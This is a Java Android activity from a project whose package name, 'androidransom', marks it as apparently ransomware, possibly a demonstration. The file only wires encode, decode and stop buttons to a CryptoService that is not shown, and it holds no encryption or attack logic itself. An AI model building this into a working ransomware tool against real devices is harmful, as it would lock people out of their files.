package bycracks.androidransom;

import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;

public class SubActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sub);

        Button.OnClickListener onClickListener = new Button.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(SubActivity.this, CryptoService.class);
                switch (view.getId()) {
                    case R.id.encodeBtn:
                        intent.putExtra("decrypt",false);
                        startService(intent);
                        break;
                    case R.id.decodeBtn:
                        intent.putExtra("decrypt",true);
                        startService(intent);
                        break;
                    case R.id.stopBtn:
                        stopService(intent);
                }


            }
        };
        Button encodeBtn = (Button) findViewById(R.id.encodeBtn);
        encodeBtn.setOnClickListener(onClickListener);
        Button decodeBtn = (Button) findViewById(R.id.decodeBtn);
        decodeBtn.setOnClickListener(onClickListener);
        Button stopBtn = (Button) findViewById(R.id.stopBtn);
        stopBtn.setOnClickListener(onClickListener);
/*
        Button btn_encode = (Button) findViewById(R.id.encodeBtn);
        btn_encode.setOnClickListener( new Button.OnClickListener() {
            @Override
            public void onClick(View v) {
                startService(new Intent(SubActivity.this, CryptoService.class));
            }
        });

        Button btn_decode = (Button) findViewById(R.id.decodeBtn);
        btn_decode.setOnClickListener( new Button.OnClickListener() {
            @Override
            public void onClick(View v) {
                startService(new Intent(SubActivity.this, DecodeService.class));
            }
        });

        Button btn_end = (Button) findViewById(R.id.stopBtn);
        btn_end.setOnClickListener( new Button.OnClickListener() {
            @Override
            public void onClick(View v) {
                stopService(new Intent(SubActivity.this, CryptoService.class));
                stopService(new Intent(SubActivity.this, DecodeService.class));
            }
        });
*/
    }


}
